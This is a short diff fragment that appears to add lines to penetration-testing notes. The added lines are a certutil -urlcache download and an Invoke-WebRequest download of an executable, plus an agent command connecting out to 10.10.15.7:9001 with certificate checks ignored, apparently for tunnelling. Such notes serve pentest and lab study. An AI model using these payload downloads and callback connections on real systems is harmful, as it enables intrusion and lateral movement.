@@ -33,3 +33,9 @@ RECONFIGURE;
 
 - MATCH (n)-[r]->(m)
 - RETURN n, r, m
+
+certutil -urlcache -split -f "http://example.com/file.exe" file.exe
+
+Invoke-WebRequest -Uri "http://example.com/file.exe" -OutFile "file.exe"
+
+./agent -connect 10.10.15.7:9001 -ignore-cert
